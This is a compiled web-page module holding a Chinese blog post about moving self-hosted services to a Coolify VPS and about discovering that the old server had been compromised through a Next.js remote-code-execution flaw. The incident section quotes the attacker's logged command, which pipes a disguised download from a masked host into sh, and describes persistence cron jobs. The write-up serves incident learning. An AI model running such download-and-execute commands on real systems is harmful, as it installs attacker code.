import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as d,c as l,f as p,b as a,d as e,a as s,w as c,e as t}from"./app-2ff98964.js";const u="/assets/images/migrate-vps-overview.jpg",h="/assets/images/migrate-vps-cost.jpg",g="/assets/images/migrate-vps-cutover.jpg",k="/assets/images/migrate-vps-rsyslo.jpg",b="/assets/images/migrate-vps-crontab.jpg",m={},f=a("h1",{id:"搬服务器-一年省一半-还发现旧机器早被黑了",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#搬服务器-一年省一半-还发现旧机器早被黑了","aria-hidden":"true"},"#"),e(" 搬服务器：一年省一半，还发现旧机器早被黑了")],-1),v=a("p",null,"去年，我在服务器上花了 $824；今年，只要 $409。省下一半，靠的是一次搬家：把散在 Zeabur 和一台旧服务器上的十几个服务，收进一台小 VPS 里。",-1),y=a("p",null,"但这次搬家最大的收获不是省钱。清点旧服务器的时候，我发现它早就被人黑了，而且已经潜伏了十个月。",-1),_=t('<figure><img src="'+u+'" alt="十几个服务从两个旧家搬进一台新 VPS" tabindex="0" loading="lazy"><figcaption>十几个服务从两个旧家搬进一台新 VPS</figcaption></figure><blockquote><p>文中的域名、IP、密码都用占位符代替，攻击者的地址已打码。</p></blockquote><h2 id="为什么要搬" tabindex="-1"><a class="header-anchor" href="#为什么要搬" aria-hidden="true">#</a> 为什么要搬</h2><p>起因是两件事撞到了一起：</p><ul><li><strong>Zeabur 年底关停。</strong> 我的三个前端、一个 Bun 后端，还有密码管理器（Vaultwarden），都在上面。</li><li><strong>旧服务器快到期。</strong> 上面用 systemd 跑着几个后端，PostgreSQL 和 Redis 是我自己编译装的。每次部署都要 SSH 上去 <code>git pull</code>，再手动重启。</li></ul><p>反正都要动，不如一次收拢到一台机器上，顺便把部署方式也换掉。</p><h2 id="先算账" tabindex="-1"><a class="header-anchor" href="#先算账" aria-hidden="true">#</a> 先算账</h2><table><thead><tr><th>项目</th><th>之前</th><th>现在</th></tr></thead><tbody><tr><td>Zeabur</td><td>$30/月 = $360/年</td><td>已关闭</td></tr><tr><td>旧服务器</td><td>$260/年</td><td>到期不续</td></tr><tr><td>新 VPS（Vultr 东京）</td><td>—</td><td>$20/月 = $240/年</td></tr><tr><td>代理</td><td>买机场 $17/月 = $204/年</td><td>自建搬瓦工 $169/年</td></tr><tr><td><strong>合计</strong></td><td><strong>$824/年</strong></td><td><strong>$409/年</strong></td></tr></tbody></table><figure><img src="'+h+'" alt="一年省下 $415" tabindex="0" loading="lazy"><figcaption>一年省下 $415</figcaption></figure>',9),x=a("strong",null,"$415",-1),C=a("h2",{id:"新家-vultr-东京-coolify",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#新家-vultr-东京-coolify","aria-hidden":"true"},"#"),e(" 新家：Vultr 东京 + Coolify")],-1),S=a("p",null,[a("strong",null,"机器"),e("选的是 Vultr 东京，2 核 4G、80G 硬盘，$20/月。东京国内访问延迟还行，也不用备案。买完先从国内测了一遍，确认没被墙、延迟能接受，才往下做。")],-1),w=a("strong",null,"部署平台",-1),R={href:"https://coolify.io",target:"_blank",rel:"noopener noreferrer"},P=t(`<ul><li>连上 GitHub，push 代码就自动构建部署；</li><li>自带 Traefik 反向代理，自动申请 Let&#39;s Encrypt 证书；</li><li>数据库一键部署，带定时备份到 S3；</li><li>每个服务能设环境变量、内存上限、定时任务。</li></ul><p>安装只要一条命令：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://cdn.coollabs.io/coolify/install.sh <span class="token operator">|</span> <span class="token function">bash</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>装完我先在设置里关了三样东西：自动更新（避免半夜自己升级出问题，改成手动升）、遥测、营销邮件。</p><p>域名上，给面板配一个子域名，再加一条泛解析 <code>*.coolify.example.com</code> 指向服务器。以后每个服务都会自动分到一个 <code>xxx.coolify.example.com</code>，不用每次去加 DNS。</p><h2 id="服务怎么搬" tabindex="-1"><a class="header-anchor" href="#服务怎么搬" aria-hidden="true">#</a> 服务怎么搬</h2><p>先列清单：</p><table><thead><tr><th>原来在哪</th><th>服务</th><th>去了哪</th></tr></thead><tbody><tr><td>Zeabur</td><td>3 个 Next.js / Vite 前端</td><td>Coolify</td></tr><tr><td>Zeabur</td><td>1 个 Bun 后端</td><td>Coolify</td></tr><tr><td>Zeabur</td><td>密码管理器（Vaultwarden）</td><td>Coolify，重新部署</td></tr><tr><td>Zeabur</td><td>IT-Tools、Excalidraw 等小工具</td><td>Cloudflare</td></tr><tr><td>旧服务器</td><td>Bun API + 后台 worker</td><td>Coolify</td></tr><tr><td>旧服务器</td><td>2 个 Go 后端</td><td>Coolify</td></tr><tr><td>旧服务器</td><td>PostgreSQL 17、Redis</td><td>Coolify 里的共享 PostgreSQL 18、Redis</td></tr><tr><td>旧服务器</td><td>没人用的老项目</td><td>不迁，数据库导出存档</td></tr></tbody></table><h3 id="有源码的-直接连-github" tabindex="-1"><a class="header-anchor" href="#有源码的-直接连-github" aria-hidden="true">#</a> 有源码的：直接连 GitHub</h3><p>在 Coolify 里装好 GitHub App，选仓库和分支，构建方式选 Dockerfile 或 Nixpacks，填好端口和域名就行。环境变量从旧平台原样搬过来，只把数据库、Redis 的地址换成新的。</p><p><strong>搬之前把配置里的所有 URL 都过一遍。</strong> 我有一个后端，旧平台的回调地址写死在配置文件里，差点漏掉。</p><h3 id="机器太小-构建放到-github-actions" tabindex="-1"><a class="header-anchor" href="#机器太小-构建放到-github-actions" aria-hidden="true">#</a> 机器太小，构建放到 GitHub Actions</h3><p>有一个 Next.js 的 monorepo，在 2 核 4G 的机器上一构建，内存就吃满，其他服务也跟着卡。做法是：</p><ol><li>在 GitHub Actions 里构建 Docker 镜像，推到 GHCR；</li><li>Coolify 里这个服务改成「从镜像部署」，构建完用 webhook 通知它去拉新镜像。</li></ol><p>服务器只管跑，不管编译，稳定多了。</p><h3 id="一个镜像-两个进程" tabindex="-1"><a class="header-anchor" href="#一个镜像-两个进程" aria-hidden="true">#</a> 一个镜像，两个进程</h3><p>Bun 的 API 和后台 worker 是同一份代码，入口不同。Coolify 里建两个应用指向同一个仓库，worker 那个在「自定义 Docker 参数」里覆盖入口：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>--entrypoint &quot;bun run src/workers/index.ts&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>worker 不需要域名，也不需要健康检查。</p><h3 id="只有二进制、没有源码的" tabindex="-1"><a class="header-anchor" href="#只有二进制、没有源码的" aria-hidden="true">#</a> 只有二进制、没有源码的</h3><p>旧服务器上有两个 Go 服务，源码早就找不到了，只剩编译好的二进制。这种也能上 Coolify：建一个私有仓库，放进二进制和一个很短的 Dockerfile，用非 root 用户运行；配置文件不进镜像，用 Coolify 的「文件挂载」挂进容器。</p><div class="language-docker line-numbers-mode" data-ext="docker"><pre class="language-docker"><code><span class="token instruction"><span class="token keyword">FROM</span> alpine:3.22</span>
<span class="token instruction"><span class="token keyword">RUN</span> adduser -D app</span>
<span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span>
<span class="token instruction"><span class="token keyword">COPY</span> server /app/server</span>
<span class="token instruction"><span class="token keyword">USER</span> app</span>
<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">&quot;/app/server&quot;</span>, <span class="token string">&quot;-c&quot;</span>, <span class="token string">&quot;/app/config/config.json&quot;</span>]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>坑：Coolify 文件挂载第一次生成的文件是空的（临时文件权限不对，Coolify 读不到内容），容器一启动就报配置错误。遇到这种情况，先进容器 <code>cat</code> 一下挂载的文件。</p></blockquote><h2 id="数据库-先瘦身-再搬" tabindex="-1"><a class="header-anchor" href="#数据库-先瘦身-再搬" aria-hidden="true">#</a> 数据库：先瘦身，再搬</h2><h3 id="一个共享实例-每个应用一个库" tabindex="-1"><a class="header-anchor" href="#一个共享实例-每个应用一个库" aria-hidden="true">#</a> 一个共享实例，每个应用一个库</h3><p>Coolify 里只部署了<strong>一个 PostgreSQL 18</strong>，所有应用共用，但每个应用有自己的库和用户：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">CREATE</span> ROLE app1 LOGIN PASSWORD <span class="token string">&#39;...&#39;</span><span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> app1 OWNER app1<span class="token punctuation">;</span>
<span class="token keyword">REVOKE</span> <span class="token keyword">CONNECT</span> <span class="token keyword">ON</span> <span class="token keyword">DATABASE</span> app1 <span class="token keyword">FROM</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最后一行很重要：默认所有用户都能连所有库，收回之后，一个应用的密码漏了，也碰不到别人的数据。比起每个应用一个数据库容器，共享实例省很多内存。数据库只在 Docker 内网暴露，不开公网端口。Redis 同理，部署一个共享的，带密码，开 AOF 持久化。</p><h3 id="迁移前先瘦身" tabindex="-1"><a class="header-anchor" href="#迁移前先瘦身" aria-hidden="true">#</a> 迁移前先瘦身</h3><p>导出前先看了一眼每个库有多大，有两个大得离谱：</p><ul><li>一个 <strong>900M</strong> 的库，大部分是 worker 每轮空转都要写一条的运行日志，还有几乎没人看的价格快照；</li><li>一个 <strong>1G</strong> 的库，97% 是每小时一份、内容完全重复的账户快照。</li></ul><p>改了代码，只在真正处理了东西时才写日志，再给快照表加上定时清理。清完之后，两个库分别剩 <strong>66M</strong> 和 <strong>11M</strong>。<strong>搬家前先查查哪些表最大，很可能一大半都不用搬。</strong></p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">SELECT</span> relname<span class="token punctuation">,</span> pg_size_pretty<span class="token punctuation">(</span>pg_total_relation_size<span class="token punctuation">(</span>relid<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">FROM</span> pg_catalog<span class="token punctuation">.</span>pg_statio_user_tables
 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> pg_total_relation_size<span class="token punctuation">(</span>relid<span class="token punctuation">)</span> <span class="token keyword">DESC</span> <span class="token keyword">LIMIT</span> <span class="token number">10</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="跨大版本-dump-restore" tabindex="-1"><a class="header-anchor" href="#跨大版本-dump-restore" aria-hidden="true">#</a> 跨大版本：dump + restore</h3><p>从 17 升到 18，不能直接拷数据目录，要用逻辑导出：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 旧服务器：导出成自定义格式（自带压缩，可以选择性恢复）</span>
pg_dump <span class="token parameter variable">-Fc</span> <span class="token parameter variable">-d</span> app1 <span class="token operator">&gt;</span> app1.dump

<span class="token comment"># 新服务器：导入到共享实例</span>
pg_restore --no-owner <span class="token parameter variable">--role</span><span class="token operator">=</span>app1 <span class="token parameter variable">-d</span> app1 app1.dump
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>--no-owner</code> 加 <code>--role</code> 让所有对象都归新用户，不用管旧库的用户名。升大版本之前，我先在本地用 postgres:18 的镜像把整套测试跑了一遍，结果一致才上线。</p><h3 id="切换顺序最重要" tabindex="-1"><a class="header-anchor" href="#切换顺序最重要" aria-hidden="true">#</a> 切换顺序最重要</h3><figure><img src="`+g+'" alt="切换顺序：停旧服务一定要在导出之前" tabindex="0" loading="lazy"><figcaption>切换顺序：停旧服务一定要在导出之前</figcaption></figure><p>每个服务都按这个顺序切：</p><ol><li><strong>新服务先部署好</strong>，连上新数据库（空库），确认能启动；</li><li><strong>停掉旧服务</strong>，确保没人再写旧库；</li><li><strong>导出、导入</strong>，然后对比每张表的行数；</li><li><strong>重启新服务</strong>，验证接口；</li><li><strong>改 DNS</strong>，指向新服务器；</li><li><strong>旧服务和旧库留着不删</strong>，出问题随时能切回去。</li></ol><p>第 2 步一定要在第 3 步前面，不然停机前那几分钟写进旧库的数据就丢了。停机时间基本就是导入那几分钟。</p><h2 id="cloudflare-帮了哪些忙" tabindex="-1"><a class="header-anchor" href="#cloudflare-帮了哪些忙" aria-hidden="true">#</a> Cloudflare 帮了哪些忙</h2><h3 id="dns-橙色云朵和证书的坑" tabindex="-1"><a class="header-anchor" href="#dns-橙色云朵和证书的坑" aria-hidden="true">#</a> DNS：橙色云朵和证书的坑</h3><p>域名本来就在 Cloudflare，切服务改一条 A 记录就行，几分钟生效。</p><blockquote><p>坑一：记录开着 Cloudflare 代理（橙色云朵），而 SSL 设置会把 HTTP 自动跳到 HTTPS。Coolify 申请 Let&#39;s Encrypt 证书时走的 HTTP 验证请求被跳走了，证书一直签不下来，只能用 Traefik 的默认证书。</p><p>解决办法：先把记录改成「仅 DNS」（灰色云朵），等证书签好再决定要不要开代理；或者 SSL 模式用「完全」而不是「完全（严格）」。</p></blockquote><blockquote><p>坑二在我自己电脑上：<code>/etc/hosts</code> 里很久以前为了调试写死过旧服务器的 IP。切完 DNS，我这边一直打开的是旧服务器，还以为没切成功。</p></blockquote><p>切完之后，记得把指向旧服务器、已经没内容的 DNS 记录删掉。</p><h3 id="r2、pages、workers" tabindex="-1"><a class="header-anchor" href="#r2、pages、workers" aria-hidden="true">#</a> R2、Pages、Workers</h3>',49),N=a("li",null,[a("strong",null,"R2 放备份。"),e(" 兼容 S3，前 10G 免费，下载不收流量费。Coolify 的数据库备份直接填 R2 的地址和密钥：每天凌晨 "),a("code",null,"pg_dumpall"),e(" 一次，本地留 7 份，R2 留 30 份。旧服务器下线前，我把上面所有的库（包括不迁移的老项目）都单独 "),a("code",null,"pg_dump"),e(" 一份放进 "),a("code",null,"old-server-archive/"),e("，上传完再下载回来校验一遍 sha256。")],-1),E=a("li",null,[a("strong",null,"Pages / Workers 放静态小工具。"),e(" IT-Tools、Excalidraw 这类纯前端工具，没必要占服务器资源，直接部署到 Cloudflare，免费、全球 CDN。顺手又加了一个文件快传和一个图床。")],-1),q={href:"https://github.com/lyc8503/UptimeFlare",target:"_blank",rel:"noopener noreferrer"},T=t(`<h2 id="小机器上的资源管理" tabindex="-1"><a class="header-anchor" href="#小机器上的资源管理" aria-hidden="true">#</a> 小机器上的资源管理</h2><p>2 核 4G 跑十几个容器，内存最紧：</p><ul><li><strong>每个服务都设内存上限。</strong> 超了只会杀掉这一个容器再拉起来，不会拖垮整台机器。</li><li><strong>吃内存的服务定时重启。</strong> Coolify 的定时任务是在容器<strong>里面</strong>执行命令，没法重启容器本身。我在宿主机加了一条 cron，按 Coolify 给容器打的标签找到它再 <code>docker restart</code>，重新部署后容器名变了也不受影响。</li><li><strong>定期清镜像。</strong> 每次部署都会留下旧镜像和构建缓存，第一次清理就腾出了 13G。Coolify 服务器设置里有自动清理磁盘的选项，可以打开。</li></ul><p>目前所有服务加起来，内存 1.7G 左右，CPU 负载 0.7，很宽裕。</p><h2 id="意外-旧服务器早就被黑了" tabindex="-1"><a class="header-anchor" href="#意外-旧服务器早就被黑了" aria-hidden="true">#</a> 意外：旧服务器早就被黑了</h2><p>搬到最后，清点旧服务器的时候，我发现了一件后背发凉的事：<code>appuser</code> 的 crontab 里多了几行我没写过的命令，家目录里还藏着一个加了壳的程序。顺着日志查下去，入口是一个我早就忘了的 Next.js 文档站。</p><h3 id="时间线" tabindex="-1"><a class="header-anchor" href="#时间线" aria-hidden="true">#</a> 时间线</h3><table><thead><tr><th>时间（北京时间）</th><th>发生了什么</th></tr></thead><tbody><tr><td>2025-12-03</td><td>React Server Components 公开远程代码执行漏洞（React2Shell，CVE-2025-55182，CVSS 10.0），Next.js 在影响范围内，几天内全网开始批量扫描</td></tr><tr><td>2025-12-06 19:57</td><td>攻击者通过文档站（Next.js 15.0.3）执行命令，放下 <code>/home/appuser/.rsyslo/rsyslo</code></td></tr><tr><td>2025-12-07 00:51</td><td><code>appuser</code> 的定时任务里被写进恶意任务</td></tr><tr><td>2025-12-07 01:14</td><td>文档站的错误日志最后一次记下攻击命令</td></tr><tr><td>2026-10</td><td>迁移清点时才发现，前后约 10 个月</td></tr></tbody></table><h3 id="它做了什么" tabindex="-1"><a class="header-anchor" href="#它做了什么" aria-hidden="true">#</a> 它做了什么</h3><p><strong>第一步：一个请求，执行一条命令。</strong> 文档站的错误日志里能看到攻击者让它执行的命令：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">(</span>curl <span class="token parameter variable">-fsSL</span> <span class="token parameter variable">-m180</span> https://pub-████.r2.dev/favicon.ico <span class="token operator">||</span> <span class="token function">wget</span> <span class="token parameter variable">-T180</span> <span class="token parameter variable">-q</span> https://pub-████.r2.dev/favicon.ico<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">sh</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>从攻击者的 R2 下载一个伪装成网站图标的脚本，直接交给 <code>sh</code> 执行。日志里有几次 <code>Command failed</code>，但后来服务器上出现了木马和定时任务，说明至少成功了一次。</p><figure><img src="`+k+'" alt="脚本放下的木马 rsyslo" tabindex="0" loading="lazy"><figcaption>脚本放下的木马 rsyslo</figcaption></figure><p><strong>第二步：放下木马。</strong> 程序叫 <code>rsyslo</code>，名字伪装成系统日志服务 rsyslog，藏在隐藏目录 <code>.rsyslo</code> 里。它是一个 1.4M 的 Linux 可执行文件，做了加壳，读不出里面的内容，所以没法确定它具体做什么。这一波 React2Shell 攻击绝大多数是装挖矿程序，它很可能也是，但没有证实。</p><figure><img src="'+b+'" alt="定时任务：每天两次重新下载" tabindex="0" loading="lazy"><figcaption>定时任务：每天两次重新下载</figcaption></figure><p><strong>第三步：写进定时任务。</strong> 一共 4 条，实际是 2 条各重复写了一遍，每天两次（UTC 03:30 和 15:30）执行：</p><ul><li>从 R2 下载一个叫 <code>corn</code> 的程序，运行完就删掉，不留痕迹；</li><li>从一个 AWS S3 存储桶下载 <code>favicon1.ico</code>，同样直接交给 <code>sh</code> 执行。</li></ul><p>这样就算木马被删了，每天也会被重新装两次。</p><p><strong>脚本本体已经拿不到了。</strong> 我检查时两个下载地址都已失效：S3 存储桶已经被删除，R2 地址被 Cloudflare 当作钓鱼网站拦截了，能下载到的只有两个错误页面。所以它到底做了什么，现在只能推测。</p><p>还好，从记录看，它没去翻我的密钥。不然，我加密钱包里那 $200，就又要被扫走一次了。</p><h3 id="教训" tabindex="-1"><a class="header-anchor" href="#教训" aria-hidden="true">#</a> 教训</h3><ul><li><strong>不用的服务就停掉。</strong> 跑着没人管的服务，才是最大的风险。</li><li><strong>框架的安全更新要跟。</strong> Next.js、React 这类框架出了高危漏洞，几天内就会被批量扫描；迁移时顺便检查一下所有服务的版本。</li><li><strong>上面用过的密钥全部换掉。</strong> 机器被入侵过，光把服务迁走是不够的。</li><li><strong>被黑过的机器不再用。</strong> 数据导出存档之后，直接退订。</li></ul><h2 id="总结" tabindex="-1"><a class="header-anchor" href="#总结" aria-hidden="true">#</a> 总结</h2><p>整个迁移花了两天左右，大部分时间不是在搬，而是在清理：给数据库瘦身，删掉没用的服务，补上监控和备份。搬完之后：</p><ul><li>一年的花费从 $824 降到 $409；</li><li>push 代码就自动部署，不用再 SSH 上去手动操作；</li><li>数据库每天自动备份到 R2，状态页盯着每个服务；</li><li>一台机器、一个面板，管理起来清楚多了。</li></ul><p>这次搬家大部分操作是 Claude Code 帮我做的：SSH 上去、调 Coolify 的 API 部署服务、导数据库、对比行数，我主要负责拍板和验收。</p><p>如果你手上也有几台零散的服务器或者几张 PaaS 账单，可以试试收进一台机器里。顺便查一查，上面还跑着哪些你早就忘了的服务。</p>',27);function L(V,D){const r=o("RouterLink"),n=o("ExternalLinkIcon");return d(),l("div",null,[f,v,y,p(" more "),_,a("p",null,[e("一年省下 "),x,e("，刚好一半。代理那部分是两周前做的，过程写在"),s(r,{to:"/posts/thinking/2026/thinking/vps-to-vpn.html"},{default:c(()=>[e("《从买一台搬瓦工 VPS 到自建代理》")]),_:1}),e("，这篇只讲服务和数据库的迁移。")]),C,S,a("p",null,[w,e("是 "),a("a",R,[e("Coolify"),s(n)]),e("，一个开源的自托管 PaaS，可以理解成自己搭的 Zeabur / Vercel：")]),P,a("ul",null,[N,E,a("li",null,[a("strong",null,[e("状态页用 "),a("a",q,[e("UptimeFlare"),s(n)])]),e("，跑在 Workers 上，定时从 Cloudflare 的节点检查所有服务。监控不在被监控的机器上，服务器挂了也能发现。检查不只看状态码，还可以要求返回内容里包含某个关键字，比如 API 要能返回数据库里的数据才算正常。")])]),T])}const G=i(m,[["render",L],["__file","migrate-vps.html.vue"]]);export{G as default};
